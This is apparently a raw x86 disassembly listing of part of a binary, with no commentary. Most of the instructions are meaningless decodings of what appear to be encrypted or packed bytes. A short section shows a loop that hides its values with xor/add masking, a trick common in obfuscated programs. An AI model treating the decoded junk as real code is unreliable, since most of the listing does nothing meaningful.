  4049ef:	mov    dh,0x91
  4049f1:	or     bh,bl
  4049f3:	add    al,0xe0
  4049f5:	mov    BYTE PTR [edx],bh
  4049f7:	mov    cl,0xd2
  4049f9:	fucomip st,st(5)
  4049fb:	push   0x63
  4049fd:	sahf   
  4049fe:	(bad)  
  4049ff:	arpl   di,di
  404a01:	loop   0x404a3c
  404a03:	sysret 
  404a05:	mov    bl,0x83
  404a07:	cmp    BYTE PTR [ebx-0x3d],al
  404a0a:	jg     0x4049a1
  404a0c:	lods   eax,DWORD PTR ds:[esi]
  404a0d:	jmp    0x4049fb
  404a0f:	out    dx,eax
  404a10:	test   eax,0x21808bea
  404a15:	inc    esp
  404a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a17:	gs pop esp
  404a19:	adc    DWORD PTR [edi+0x6a],esi
  404a1c:	mov    ebp,0xdd68b983
  404a21:	mov    esp,0xf7a46454
  404a26:	dec    edx
  404a27:	out    dx,al
  404a28:	mov    eax,ds:0xef7ebff4
  404a2d:	pop    DWORD PTR [ebx+0x4d]
  404a30:	mov    al,ds:0xa1256b0e
  404a35:	loopne 0x404a63
  404a37:	inc    ecx
  404a38:	pop    ds
  404a39:	xor    al,0xbd
  404a3b:	jbe    0x4049f5
  404a3d:	enter  0x975c,0x9a
  404a41:	nop
  404a42:	(bad)  
  404a43:	aad    0xba
  404a45:	mov    bh,BYTE PTR [esi+0x5065c186]
  404a4b:	dec    edx
  404a4c:	pushf  
  404a4d:	add    DWORD PTR ds:0x456e91b2,0xb25b3c13
  404a57:	sbb    BYTE PTR ds:0x28de0504,al
  404a5d:	pop    ds
  404a5e:	addr16 mov dh,0x9a
  404a61:	mov    DWORD PTR [esi],ebp
  404a63:	cwde   
  404a64:	ds jbe 0x404a98
  404a67:	mov    cl,0xfe
  404a69:	and    DWORD PTR [eax+0x4b],0x7d
  404a6d:	arpl   WORD PTR [ebx],sp
  404a6f:	fsub   DWORD PTR [ecx]
  404a71:	aad    0x7a
  404a73:	je     0x404a24
  404a75:	dec    ebx
  404a76:	(bad)  
  404a78:	mov    ?,ebx
  404a7a:	icebp  
  404a7b:	repz pop esp
  404a7d:	xor    DWORD PTR [eax+0x5a],esp
  404a80:	xchg   BYTE PTR [edi+0x3b],bl
  404a83:	repz mov dh,0xbf
  404a86:	mov    dl,0x17
  404a88:	sub    DWORD PTR [eax-0x39],0x71ed3fbf
  404a8f:	shl    ecx,1
  404a91:	mov    dl,0x7e
  404a93:	in     eax,0xcc
  404a95:	push   ecx
  404a96:	dec    ebp
  404a97:	adc    DWORD PTR [eax],esi
  404a99:	outs   dx,BYTE PTR ds:[esi]
  404a9a:	shl    BYTE PTR [esi-0x15],1
  404a9d:	inc    edx
  404a9e:	call   0xe1e680ec
  404aa3:	cmp    eax,0x185e175e
  404aa8:	scas   al,BYTE PTR es:[edi]
  404aa9:	sbb    cl,dl
  404aab:	jmp    0x404ad9
  404aad:	or     ecx,DWORD PTR [ecx-0xc3a3bf8]
  404ab3:	in     eax,0xc8
  404ab5:	push   0x2e7c242b
  404aba:	lea    esp,[ecx-0x31]
  404abd:	sbb    al,0x31
  404abf:	xlat   BYTE PTR ds:[ebx]
  404ac0:	inc    ebp
  404ac1:	cdq    
  404ac2:	imul   ah
  404ac4:	pop    ebx
  404ac5:	ja     0x404b00
  404ac7:	push   esi
  404ac8:	(bad)  
  404ac9:	xor    al,0x4
  404acb:	aam    0x3b
  404acd:	mov    es,WORD PTR [esi]
  404acf:	es pop ebx
  404ad1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404ad3:	fwait
  404ad4:	daa    
  404ad5:	(bad)  
  404ad6:	loopne 0x404a84
  404ad8:	add    ebx,edx
  404ada:	xor    eax,0xe3d33f7c
  404adf:	mov    eax,ds:0x333b03e7
  404ae4:	inc    edx
  404ae5:	in     eax,dx
  404ae6:	ins    DWORD PTR es:[edi],dx
  404ae7:	pop    ss
  404ae8:	sub    al,0x1f
  404aea:	sub    BYTE PTR [esi+eiz*1-0x66697a3e],dl
  404af1:	out    0x2a,eax
  404af3:	add    DWORD PTR [edi-0x49b33bcd],edx
  404af9:	jne    0x404b17
  404afb:	scas   eax,DWORD PTR es:[edi]
  404afc:	rcl    ah,cl
  404afe:	mov    eax,ds:0x6ad095ce
  404b03:	rcl    BYTE PTR [ebx-0x7c50086b],0x24
  404b0a:	pop    ebp
  404b0b:	ss or  al,0xd6
  404b0e:	push   0x1945f328
  404b13:	packuswb mm0,QWORD PTR cs:[eax-0x69e37b69]
  404b1b:	(bad)  
  404b1c:	out    0x2c,eax
  404b1e:	popf   
  404b1f:	outs   dx,DWORD PTR ds:[esi]
  404b20:	imul   ecx,DWORD PTR [ebp+0x34],0x1677673a
  404b27:	in     eax,0xdc
  404b29:	jne    0x404ba9
  404b2b:	mov    eax,0x2bca9e56
  404b30:	mov    ecx,0x7fa87ec
  404b35:	jno    0x404b58
  404b37:	cli    
  404b38:	je     0x404b23
  404b3a:	jmp    0x404b97
  404b3c:	retf   0x829e
  404b3f:	dec    ebx
  404b40:	or     BYTE PTR [ebx+0xb1c0be3],bh
  404b46:	std    
  404b47:	and    al,0x18
  404b49:	and    DWORD PTR [ecx-0x37],ebp
  404b4c:	aaa    
  404b4d:	sbb    esp,DWORD PTR [edx+0x175e80da]
  404b53:	pop    ds
  404b54:	out    0x12,al
  404b56:	push   eax
  404b57:	jg     0x404b13
  404b59:	push   esp
  404b5a:	pop    ecx
  404b5b:	fcom   QWORD PTR [ebx+0x3]
  404b5e:	clc    
  404b5f:	adc    DWORD PTR [ebx+0x11],ecx
  404b62:	push   esi
  404b63:	jl     0x404b8a
  404b65:	fidiv  DWORD PTR [ecx-0x5afce332]
  404b6b:	test   eax,0x79877a00
  404b70:	not    DWORD PTR [esi-0x1bb353f4]
  404b76:	dec    ebx
  404b77:	jmp    0x404bee
  404b79:	inc    ebx
  404b7a:	and    edi,DWORD PTR [edx]
  404b7c:	jno    0x404bc6
  404b7e:	out    0x31,al
  404b80:	cmp    DWORD PTR ds:0xe198cc6,ecx
  404b86:	push   edi
  404b87:	mov    ds,WORD PTR [esi+ebp*8+0x61]
  404b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8c:	pop    eax
  404b8d:	aam    0xc9
  404b8f:	ret    0xa26e
  404b92:	mov    DWORD PTR [esi+0x6a],edx
  404b95:	inc    edi
  404b96:	mov    ebp,0x8cc62d71
  404b9b:	(bad)  
  404b9c:	lahf   
  404b9d:	jo     0x404b22
  404b9f:	ss jle 0x404ba5
  404ba2:	test   al,0x9a
  404ba4:	dec    edx
  404ba5:	(bad)  
  404ba6:	mov    ds:0xa1664c9f,eax
  404bab:	dec    esp
  404bac:	aad    0x54
  404bae:	stos   DWORD PTR es:[edi],eax
  404baf:	cmp    al,0x88
  404bb1:	jl     0x404c31
  404bb3:	jg     0x404bc1
  404bb5:	jne    0x404c27
  404bb7:	and    DWORD PTR [ecx-0x22d0f12e],ecx
  404bbd:	jp     0x404c2b
  404bbf:	mov    cl,0x41
  404bc1:	addr16 shl dh,cl
  404bc4:	rol    DWORD PTR [edi],0x40
  404bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bc8:	pop    ecx
  404bc9:	inc    ecx
  404bca:	mov    al,0xd0
  404bcc:	aam    0x66
  404bce:	jb     0x404bd7
  404bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bd1:	daa    
  404bd2:	adc    eax,0xd5b41a99
  404bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd8:	or     dh,dh
  404bda:	push   0x1c
  404bdc:	mov    eax,0x5fc45c18
  404be1:	shl    DWORD PTR ds:0x46ba1c17,cl
  404be7:	jne    0x404b90
  404be9:	scas   eax,DWORD PTR es:[edi]
  404bea:	sbb    esp,DWORD PTR [ecx-0x37]
  404bed:	mov    cl,0xa4
  404bef:	stos   BYTE PTR es:[edi],al
  404bf0:	test   al,0x64
  404bf2:	pop    ds
  404bf3:	mov    cl,0xb7
  404bf5:	pop    ds
  404bf6:	mov    bh,0xd5
  404bf8:	cmp    al,0x58
  404bfa:	sbb    eax,0x2baddfe9
  404bff:	repnz nop
  404c01:	and    DWORD PTR [ebx],0x6f
  404c04:	pop    esp
  404c05:	es xlat BYTE PTR fs:[ebx]
  404c08:	out    dx,eax
  404c09:	or     ebp,0x2c
  404c0c:	lock inc ecx
  404c0e:	cs je  0x404bb0
  404c11:	xchg   esi,eax
  404c12:	xlat   BYTE PTR ds:[ebx]
  404c13:	cmp    eax,0xeadb0846
  404c18:	outs   dx,BYTE PTR ds:[esi]
  404c19:	(bad)  
  404c1a:	mov    ebx,0xbf7818b9
  404c1f:	and    bl,BYTE PTR [esi]
  404c21:	daa    
  404c22:	and    esi,edx
  404c24:	or     DWORD PTR [edi],0xffffff96
  404c27:	loop   0x404c96
  404c29:	jl     0x404c42
  404c2b:	lods   al,BYTE PTR ds:[esi]
  404c2c:	add    esp,edx
  404c2e:	and    eax,0x9ba14bff
  404c33:	mov    bh,BYTE PTR ds:0x24990304
  404c39:	push   es
  404c3a:	in     eax,0xfa
  404c3c:	xchg   esi,eax
  404c3d:	jecxz  0x404c2e
  404c3f:	les    sp,DWORD PTR [ebp-0x1dcc1cf0]
  404c46:	(bad)  
  404c47:	fwait
  404c48:	repnz inc esi
  404c4a:	gs fmul st(5),st
  404c4d:	cmp    BYTE PTR [edi+ebp*1-0xb75102d],ch
  404c54:	and    BYTE PTR [esi],bl
  404c56:	rol    cl,0x71
  404c59:	pushf  
  404c5a:	xor    al,0xcc
  404c5c:	idiv   eax
  404c5e:	aaa    
  404c5f:	push   esi
  404c60:	dec    ebp
  404c61:	mov    eax,0xfb77d2c7
  404c66:	call   0x966c55
  404c6b:	pop    esp
  404c6c:	dec    esp
  404c6d:	push   ds
  404c6e:	add    cl,dh
  404c70:	je     0x404cc6
  404c72:	push   ecx
  404c73:	xchg   edx,eax
  404c74:	mov    bl,0xcf
  404c76:	gs aaa 
  404c78:	ins    DWORD PTR es:[edi],dx
  404c79:	jnp    0x404c53
  404c7b:	fisttp DWORD PTR [ecx]
  404c7d:	cmp    dh,bh
  404c7f:	jae    0x404ca9
  404c81:	ficom  DWORD PTR ds:0x6009e07
  404c87:	mov    fs,esi
  404c89:	push   edi
  404c8a:	xchg   ebp,eax
  404c8b:	sbb    al,dl
  404c8d:	into   
  404c8e:	mov    ebp,0x631fedf9
  404c93:	jne    0x404c45
  404c95:	inc    esi
  404c96:	arpl   WORD PTR [edi-0x5e],sp
  404c99:	add    ebp,DWORD PTR [edx-0x78d15803]
  404c9f:	shl    si,0xb
  404ca3:	ins    DWORD PTR es:[edi],dx
  404ca4:	pop    edx
  404ca5:	mov    edi,DWORD PTR [edx+ebx*1-0x3f]
  404ca9:	pop    esp
  404caa:	push   edx
  404cab:	sub    edi,eax
  404cad:	dec    ebx
  404cae:	arpl   WORD PTR [edx-0x3c],bx
  404cb1:	adc    eax,0x65d33c80
  404cb6:	push   ebp
  404cb7:	mov    edi,DWORD PTR [ecx]
  404cb9:	es dec ecx
  404cbb:	(bad)  
  404cbc:	hlt    
  404cbd:	loopne 0x404cf5
  404cbf:	xchg   ecx,eax
  404cc0:	mov    eax,ds:0x9ca32317
  404cc5:	(bad)  
  404cc6:	jns    0x404d33
  404cc8:	mov    dl,bh
  404cca:	pop    ds
  404ccb:	out    0x8d,al
  404ccd:	inc    ebx
  404cce:	push   ecx
  404ccf:	dec    ebx
  404cd0:	jmp    0x65b9bf5f
  404cd5:	stc    
  404cd6:	outs   dx,DWORD PTR ds:[esi]
  404cd7:	mov    edi,0x988e4a41
  404cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cdd:	lock xor al,0xd1
  404ce0:	push   es
  404ce1:	or     dh,0xa
  404ce4:	sbb    eax,0xbf2083d0
  404ce9:	fnstenv [esi-0x2c16b7bc]
  404cef:	bound  esp,QWORD PTR [edi]
  404cf1:	enter  0x3715,0x3a
  404cf5:	pop    ebp
  404cf6:	adc    DWORD PTR [ebp-0x34beb320],0xa0fba92b
  404d00:	dec    esp
  404d01:	jbe    0x404cc6
  404d03:	rcl    bl,0xd
  404d06:	add    BYTE PTR [esi-0x38fc8e90],ah
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x1a]
  404d39:	sbb    BYTE PTR [edx+esi*4+0x70702e96],ah
  404d40:	cmp    eax,0xf770707d
  404d45:	repnz mov ebx,0xc2d47062
  404d4b:	jno    0x404d42
  404d4d:	outs   dx,DWORD PTR ds:[esi]
  404d4e:	mov    dl,BYTE PTR [esi-0x67ddd406]
  404d54:	mov    edi,0x56968866
  404d59:	imul   ebx,DWORD PTR [edi-0x6],0x58688a44
  404d60:	pop    eax
  404d61:	lock push eax
  404d63:	dec    edx
  404d64:	out    dx,eax
  404d65:	inc    edi
  404d66:	pop    edi
  404d67:	popf   
  404d68:	sub    DWORD PTR [edi+esi*1+0x5b],eax
  404d6c:	lods   al,BYTE PTR ds:[esi]
  404d6d:	imul   ebx,DWORD PTR [ebp-0x3150f596],0x4f12c4b3
  404d77:	leave  
  404d78:	and    eax,0xc4a1881e
  404d7d:	and    eax,0xf0438f4f
  404d82:	ds dec edx
  404d84:	cmp    eax,0x2239944c
  404d89:	enter  0xcccf,0xae
  404d8d:	(bad)  
  404d8e:	jle    0x404e0d
  404d90:	push   DWORD PTR ds:0xa244e8d3
  404d96:	jns    0x404d8b
  404d98:	lea    edi,[edi+ecx*4]
  404d9b:	xor    al,0xbc
  404d9d:	outs   dx,BYTE PTR ds:[esi]
  404d9e:	jnp    0x404df5
  404da0:	fcomp  DWORD PTR [eax]
  404da2:	ret    
  404da3:	or     BYTE PTR [eax-0x649c2e46],0x36
  404daa:	(bad)  
  404dab:	in     eax,0x8
  404dad:	cmc    
  404dae:	sbb    eax,0xa2816667
  404db3:	popf   
  404db4:	in     eax,0x91
  404db6:	or     edi,DWORD PTR fs:[edi]
  404db9:	pushf  
  404dba:	hlt    
  404dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dbc:	(bad)  
  404dbe:	jmp    0xff824805
  404dc3:	ret    0x5286
  404dc6:	push   ds
  404dc7:	cmp    BYTE PTR [edx],bl
  404dc9:	std    
  404dca:	(bad)  
  404dcb:	ins    BYTE PTR es:[edi],dx
  404dcc:	jns    0x404e29
  404dce:	daa    
  404dcf:	mov    eax,ds:0x7724284b
  404dd4:	mov    dl,bl
  404dd6:	call   0x3c46:0x7a6e4f60
  404ddd:	clc    
  404dde:	loope  0x404dd7
  404de0:	test   eax,0x940668a2
  404de5:	imul   edx,edx,0x3423dbfd
  404deb:	add    BYTE PTR [eax+0x40],dl
  404dee:	or     eax,0x542fe376
  404df3:	pop    es
  404df4:	jecxz  0x404e70
  404df6:	jle    0x404d79
  404df8:	pop    eax
  404df9:	jg     0x404daa
  404dfb:	sub    eax,0xc85d5241
  404e00:	add    DWORD PTR [edx+0x1f],0xb65670fe
  404e07:	xchg   edi,eax
  404e08:	xchg   edi,eax
  404e09:	cwde   
  404e0a:	std    
  404e0b:	inc    edx
  404e0c:	in     al,dx
  404e0d:	ds push cs
  404e0f:	ret    
  404e10:	clc    
  404e11:	mov    ds:0x40bc9e09,al
  404e16:	inc    ebp
  404e17:	dec    ecx
  404e18:	out    0xa3,al
  404e1a:	outs   dx,DWORD PTR ds:[esi]
  404e1b:	push   eax
  404e1c:	adc    eax,DWORD PTR [edi-0x2fc4fced]
  404e22:	jo     0x404dab
  404e24:	sub    BYTE PTR [edx+0x34],dl
  404e27:	aas    
  404e28:	pushf  
  404e29:	cli    
  404e2a:	lods   al,BYTE PTR ds:[esi]
  404e2b:	mov    dh,BYTE PTR [ecx+ebx*8-0x7e162920]
  404e32:	mov    DWORD PTR es:[ecx+0x3422486a],eax
  404e39:	stc    
  404e3a:	out    dx,eax
  404e3b:	sbb    eax,DWORD PTR [eax+eax*8]
  404e3e:	mov    dh,0x7
  404e40:	xlat   BYTE PTR ds:[ebx]
  404e41:	and    ebx,ecx
  404e43:	popf   
  404e44:	pop    edx
  404e45:	add    al,0x5b
  404e47:	nop
  404e48:	aas    
  404e49:	popf   
  404e4a:	retf   0x16ea
  404e4d:	xor    DWORD PTR [ebx-0x73],ebp
  404e50:	pop    ecx
  404e51:	daa    
  404e52:	pusha  
  404e53:	addr16 push ecx
  404e55:	(bad)  
  404e56:	cmp    al,0xe2
  404e58:	fist   DWORD PTR [esi]
  404e5a:	hlt    
  404e5b:	or     DWORD PTR [eax+0x6e],0x2149f963
  404e62:	out    dx,eax
  404e63:	(bad)  
  404e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e65:	outs   dx,BYTE PTR ds:[esi]
  404e66:	cmp    al,0xe8
  404e68:	sbb    DWORD PTR [ebx+0x7c0bf23b],0x45
  404e6f:	xchg   eax,eax
  404e71:	aam    0x9
  404e73:	stos   BYTE PTR es:[edi],al
  404e74:	dec    edi
  404e75:	cs add eax,0x8aacd20e
  404e7b:	das    
  404e7c:	int3   
  404e7d:	dec    eax
  404e7e:	es ja  0x404efa
  404e81:	int3   
  404e82:	out    0x59,al
  404e84:	add    ecx,DWORD PTR [ebx]
  404e86:	push   ebx
  404e87:	push   ds
  404e88:	popa   
  404e89:	neg    BYTE PTR [ebx+0x12]
  404e8c:	call   FWORD PTR [ecx+0x18]
  404e8f:	scas   al,BYTE PTR es:[edi]
  404e90:	aad    0x99
  404e92:	jmp    0xda703769
  404e97:	mov    ebp,0xad845146
  404e9c:	repz (bad) 
  404e9e:	stos   BYTE PTR es:[edi],al
  404e9f:	sahf   
  404ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ea1:	loopne 0x404e6c
  404ea3:	push   ss
  404ea4:	mov    esi,0x851f23fb
  404ea9:	popf   
  404eaa:	sbb    bh,BYTE PTR [ebp-0x2f]
  404ead:	in     al,0x3c
  404eaf:	iret   
  404eb0:	leave  
  404eb1:	shl    dl,0x32
  404eb4:	mov    bh,al
  404eb6:	out    dx,eax
  404eb7:	lea    ebp,[ebx*1-0x7f02d4b9]
  404ebe:	sub    ecx,DWORD PTR [esi]
  404ec0:	jbe    0x404ef3
  404ec2:	out    0x9c,al
  404ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ec5:	loop   0x404f34
  404ec7:	pop    esi
  404ec8:	xor    DWORD PTR cs:[ebp+0x38],edi
  404ecc:	pop    edi
  404ecd:	das    
  404ece:	adc    esp,DWORD PTR [ebp-0x33]
  404ed1:	mov    al,0x79
  404ed3:	retf   
  404ed4:	jmp    0xcb741894
  404ed9:	jnp    0x404f4e
  404edb:	dec    DWORD PTR [ecx]
  404edd:	neg    BYTE PTR [ecx+0x65f34bc1]
  404ee3:	aaa    
  404ee4:	in     al,0x10
  404ee6:	xor    BYTE PTR [ebp+0x4],0x8d
  404eea:	xor    ah,al
  404eec:	fimul  WORD PTR [esi-0x57f7b892]
  404ef2:	dec    esp
  404ef3:	(bad)  [ecx+0x6a]
  404ef6:	add    ah,BYTE PTR [ebx-0x1a]
  404ef9:	jecxz  0x404ee6
  404efb:	push   cs
  404efc:	jne    0x404e86
  404efe:	sahf   
  404eff:	ret    0xf04e
  404f02:	sbb    BYTE PTR [edi-0x15],0x8e
  404f06:	ret    
  404f07:	lods   eax,DWORD PTR ds:[esi]
  404f08:	jmp    0xa8bce273
  404f0d:	xchg   esi,eax
  404f0e:	mov    ds:0x99de3615,al
  404f13:	iret   
  404f14:	dec    edx
  404f15:	jne    0x404f74
  404f17:	js     0x404f58
  404f19:	jp     0x404ed7
  404f1b:	or     ecx,DWORD PTR [edx]
  404f1d:	dec    ebx
  404f1e:	scas   al,BYTE PTR es:[edi]
  404f1f:	not    bh
  404f21:	fldln2 
  404f23:	push   edi
  404f24:	repnz add BYTE PTR [edx-0x59],dl
  404f28:	mov    dh,0x4b
  404f2a:	stos   DWORD PTR es:[edi],eax
  404f2b:	fild   DWORD PTR [ebx+0x7e3c162c]
  404f31:	data16 xor al,BYTE PTR ds:0x23d0b035
  404f38:	call   0x4fcecd7
  404f3d:	in     al,dx
  404f3e:	retf   0x24d8
  404f41:	push   0xd6e4eb55
  404f46:	and    ebp,DWORD PTR [edi+0x3f7639b5]
  404f4c:	push   cs
  404f4d:	enter  0xd122,0xb2
  404f51:	jmp    0x404f4b
  404f53:	rcr    BYTE PTR [ecx],0xcd
  404f56:	and    BYTE PTR [ecx],0xec
  404f59:	test   bl,dh
  404f5b:	bound  eax,QWORD PTR [ebx-0xc]
  404f5e:	in     eax,0x39
  404f60:	ins    DWORD PTR es:[edi],dx
  404f61:	add    eax,0x4803a6d6
  404f66:	test   BYTE PTR [edx-0x6e],bl
  404f69:	xchg   ebx,eax
  404f6a:	or     DWORD PTR [edi+0x10],edx
  404f6d:	adc    al,0x50
  404f6f:	inc    edx
  404f70:	cs pop edi
  404f72:	sub    eax,DWORD PTR [ebx]
  404f74:	add    ah,BYTE PTR ds:0x92046733
  404f7a:	fcmovbe st,st(4)
  404f7c:	or     BYTE PTR [esi],dl
  404f7e:	cmp    bl,BYTE PTR [ebx]
  404f80:	hlt    
  404f81:	jl     0x404f03
  404f83:	mov    edi,fs
  404f85:	cld    
  404f86:	cmp    ebx,esp
  404f88:	push   ebp
  404f89:	iret   
  404f8a:	xchg   edx,eax
  404f8b:	out    dx,al
  404f8c:	adc    DWORD PTR [ebx-0x6877eedf],edx
  404f92:	das    
  404f93:	jle    0x404ffd
  404f95:	sbb    cl,BYTE PTR [eax-0x7c]
  404f98:	shl    DWORD PTR ds:0x8b2ff7d5,0x90
  404f9f:	fwait
  404fa0:	push   es
  404fa1:	mov    ebx,0x1652ba4d
  404fa6:	loopne 0x404f37
  404fa8:	jo     0x404f57
  404faa:	sub    cl,BYTE PTR [ecx+0x24]
  404fad:	mov    esp,0x63a8d652
  404fb2:	daa    
  404fb3:	mov    dh,0x35
  404fb5:	es lock aad 0x71
  404fb9:	jbe    0x404f62
  404fbb:	outs   dx,DWORD PTR ds:[esi]
  404fbc:	enter  0x3385,0xf1
  404fc0:	pushf  
  404fc1:	int    0xb1
  404fc3:	push   esi
  404fc4:	mov    ah,0x6a
  404fc6:	ss dec edi
  404fc8:	test   DWORD PTR [ecx],ebp
  404fca:	fcmovnbe st,st(0)
  404fcc:	mov    BYTE PTR [edx],dl
  404fce:	ins    BYTE PTR es:[edi],dx
  404fcf:	fs out 0xb8,al
  404fd2:	mov    BYTE PTR [edi-0x1d0961a0],dl
  404fd8:	dec    ebx
  404fd9:	and    BYTE PTR [edx+0xf],dl
  404fdc:	stos   BYTE PTR es:[edi],al
  404fdd:	mov    ecx,0xd372dac5
  404fe2:	cmp    eax,DWORD PTR [ecx]
  404fe4:	cmc    
  404fe5:	jbe    0x404fbc
  404fe7:	sub    DWORD PTR [ebx+0x3c],ebx
  404fea:	mov    esi,0xae8b8baf
  404fef:	sub    cl,BYTE PTR [edi]
  404ff1:	shl    DWORD PTR [eax+0x30],0xd
  404ff5:	popa   
  404ff6:	cmp    edx,DWORD PTR [eax+edx*4]
  404ff9:	out    dx,al
  404ffa:	nop
  404ffb:	fsub   st,st(2)
  404ffd:	leave  
  404ffe:	mov    al,0x4
  405000:	xchg   edx,eax
  405001:	pop    eax
  405002:	call   0xf1b3:0x8689b6ad
  405009:	push   edi
  40500a:	shr    DWORD PTR [ecx],0x29
  40500d:	imul   esp,ebx,0x170868d9
  405013:	adc    eax,0xbf562144
  405018:	fadd   DWORD PTR ds:0x4ea6981b
  40501e:	stc    
  40501f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405020:	lahf   
  405021:	and    edx,DWORD PTR [edi+ebx*4-0x75f061b2]
  405028:	int    0x65
  40502a:	mov    WORD PTR [eax+0x36],es
  40502d:	jne    0x404ff2
  40502f:	lods   eax,DWORD PTR ds:[esi]
  405030:	fmul   st,st(5)
  405032:	cmc    
  405033:	jbe    0x40507e
  405035:	jmp    0x405048
  405037:	jne    0x405069
  405039:	dec    ebx
  40503a:	add    al,BYTE PTR [edi-0x55502e23]
  405040:	sbb    ah,BYTE PTR [edx]
  405042:	shl    DWORD PTR [edi],0xad
  405045:	lods   eax,DWORD PTR ds:[esi]
  405046:	sbb    eax,0xa6581833
  40504b:	push   ss
  40504c:	mov    eax,0x8dff248
  405051:	fnstenv [edi+0x2fe77e0a]
  405057:	sub    ebx,DWORD PTR [edx]
  405059:	dec    edx
  40505a:	hlt    
  40505b:	iret   
  40505c:	jnp    0x4050cc
  40505e:	add    eax,ebx
  405060:	dec    esi
  405061:	mov    dh,0xfa
  405063:	(bad)  
  405064:	push   0xc83a44fa
  405069:	mov    edx,0x36925346
  40506e:	dec    esi
  40506f:	jns    0x4050b5
  405071:	fwait
  405072:	(bad)  
  405073:	ret    0xa020
  405076:	dec    eax
  405077:	nop
  405078:	xor    al,0x78
  40507a:	shl    DWORD PTR [esi],1
  40507c:	cmp    BYTE PTR [ecx-0x5f174f0a],0xf5
  405083:	adc    ecx,DWORD PTR [edx-0x1d]
  405086:	or     cl,BYTE PTR [ebx+0x3b42f445]
  40508c:	ror    BYTE PTR [edi],1
  40508e:	test   DWORD PTR [edx+0x5ffffff8],ebp
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    DWORD PTR [eax],0x6b
  405133:	(bad)  
  405134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xf570707d
  40513e:	stos   DWORD PTR es:[edi],eax
  40513f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405140:	dec    edx
  405141:	sub    DWORD PTR [ebp-0x5a],0x11
  405145:	mov    ecx,0x40db4e9
  40514a:	add    BYTE PTR [ebx-0x79],bh
  40514d:	push   ebp
  40514e:	sub    ah,BYTE PTR [ecx]
  405150:	ins    DWORD PTR es:[edi],dx
  405151:	adc    BYTE PTR [edx],ch
  405153:	ffree  st(6)
  405155:	dec    edx
  405156:	leave  
  405157:	ss pop ebx
  405159:	jg     0x4050e8
  40515b:	cmp    BYTE PTR [ebx-0x32],ah
  40515e:	jae    0x4050e9
  405160:	ins    BYTE PTR es:[edi],dx
  405161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405162:	repz fld TBYTE PTR [eax+0x3a602e9]
  405169:	push   ds
  40516a:	dec    esi
  40516b:	call   0xcbd2:0xde02e294
  405172:	in     eax,0xa7
  405174:	not    DWORD PTR [esi-0x7d]
  405177:	add    esp,edx
  405179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40517a:	add    BYTE PTR [ecx-0x75],0x4
  40517e:	and    edi,DWORD PTR [ebx-0x2e]
  405181:	push   ss
  405182:	xor    esi,edx
  405184:	(bad)  [esi+0x2bf1de21]
  40518a:	(bad)  
  40518b:	and    bh,BYTE PTR [ebx+0x37]
  40518e:	xchg   DWORD PTR [ebx],eax
  405190:	pop    esi
